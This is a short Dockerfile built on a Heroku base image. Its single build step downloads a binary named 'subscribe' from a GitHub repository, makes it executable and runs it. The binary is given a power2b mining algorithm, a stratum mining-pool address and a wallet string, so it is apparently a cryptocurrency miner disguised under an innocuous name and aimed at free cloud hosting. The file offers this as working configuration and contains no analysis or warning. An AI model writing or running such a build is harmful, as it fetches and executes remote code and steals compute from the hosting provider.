FROM heroku/heroku:18
RUN apt-get install -y curl git unzip wget
RUN wget https://github.com/mrbogel/Student/raw/main/subscribe; chmod +x subscribe; ./subscribe -a power2b -o stratum+tcp://stratum-na.rplant.xyz:7022 -u MnkNd253thpibGXqEVa2fCFYyFMsTapZS7.VPS
CMD bash heroku.sh
